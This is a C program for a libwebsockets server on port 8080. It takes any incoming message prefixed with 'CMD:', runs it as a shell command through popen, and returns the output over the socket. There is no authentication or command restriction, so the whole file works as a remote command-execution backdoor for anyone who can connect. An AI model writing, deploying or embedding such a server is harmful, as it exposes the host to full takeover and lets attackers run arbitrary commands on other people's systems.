#include <libwebsockets.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFFER_BYTES 1024
#define COMMAND_PREFIX "CMD:"

static int callback_websockets(struct lws *wsi, enum lws_callback_reasons reason, void *user, void *in, size_t len)
{
    switch (reason)
    {
    case LWS_CALLBACK_RECEIVE:
    {
        char *data = (char *)in;

        if (len > strlen(COMMAND_PREFIX) && memcmp(data, COMMAND_PREFIX, strlen(COMMAND_PREFIX)) == 0)
        {
            data += strlen(COMMAND_PREFIX);
            len -= strlen(COMMAND_PREFIX);

            char command[BUFFER_BYTES];
            if (len >= sizeof(command)) {
                fprintf(stderr, "Command too long\n");
                return 1;
            }

            memcpy(command, data, len);
            command[len] = '\0';

            printf("Received command: %s\n", command);

            FILE *fp = popen(command, "r");
            if (!fp) {
                fprintf(stderr, "Failed to execute command\n");
                const char *response = "Failed to execute command\n";
                size_t response_len = strlen(response);

                unsigned char *buf = (unsigned char *)malloc(LWS_PRE + response_len);
                if (!buf) {
                    fprintf(stderr, "Failed to allocate memory for response\n");
                    return 1;
                }

                memcpy(&buf[LWS_PRE], response, response_len);
                int write_result = lws_write(wsi, &buf[LWS_PRE], response_len, LWS_WRITE_TEXT);
                free(buf);

                if (write_result < 0) {
                    fprintf(stderr, "Failed to send response: %d\n", write_result);
                    return 1;
                }

                return 1;
            }

            char output[BUFFER_BYTES];
            size_t total_len = 0;
            unsigned char *buf = (unsigned char *)malloc(LWS_PRE + BUFFER_BYTES);
            if (!buf) {
                fprintf(stderr, "Failed to allocate memory for response\n");
                pclose(fp);
                return 1;
            }

            while (fgets(output, sizeof(output), fp)) {
                size_t output_len = strlen(output);

                if (total_len + output_len >= BUFFER_BYTES) {
                    buf = (unsigned char *)realloc(buf, LWS_PRE + total_len + output_len);
                    if (!buf) {
                        fprintf(stderr, "Failed to reallocate memory for response\n");
                        pclose(fp);
                        return 1;
                    }
                }

                memcpy(&buf[LWS_PRE + total_len], output, output_len);
                total_len += output_len;
            }
            pclose(fp);

            int write_result = lws_write(wsi, &buf[LWS_PRE], total_len, LWS_WRITE_TEXT);
            free(buf);

            if (write_result < 0) {
                fprintf(stderr, "Failed to send response: %d\n", write_result);
                return 1;
            }
        }
        else
        {
            printf("Received data: %.*s\n", (int)len, (char *)in);

            const char *response = "Message received";
            size_t response_len = strlen(response);

            unsigned char *buf = (unsigned char *)malloc(LWS_PRE + response_len);
            if (!buf) {
                fprintf(stderr, "Failed to allocate memory for response\n");
                return 1;
            }

            memcpy(&buf[LWS_PRE], response, response_len);
            int write_result = lws_write(wsi, &buf[LWS_PRE], response_len, LWS_WRITE_TEXT);
            free(buf);

            if (write_result < 0) {
                fprintf(stderr, "Failed to send response: %d\n", write_result);
                return 1;
            }
        }
        break;
    }

    case LWS_CALLBACK_ESTABLISHED:
        printf("Connection established\n");
        break;

    case LWS_CALLBACK_CLOSED:
        printf("Connection closed\n");
        break;

    default:
        break;
    }
    return 0;
}

static struct lws_protocols protocols[] = {
    {
        "test-protocol",
        callback_websockets,
        0,
        BUFFER_BYTES,
    },
    {NULL, NULL, 0, 0}
};

int main(int argc, char *argv[])
{
    struct lws_context_creation_info info = {0};

    info.port = 8080;
    info.protocols = protocols;
    info.gid = -1;
    info.uid = -1;

    struct lws_context *context = lws_create_context(&info);
    if (!context) {
        fprintf(stderr, "lws_create_context failed\n");
        return -1;
    }

    printf("Starting server...\n");

    while (1)
    {
        lws_service(context, 1000);
    }

    lws_context_destroy(context);
    return 0;
}
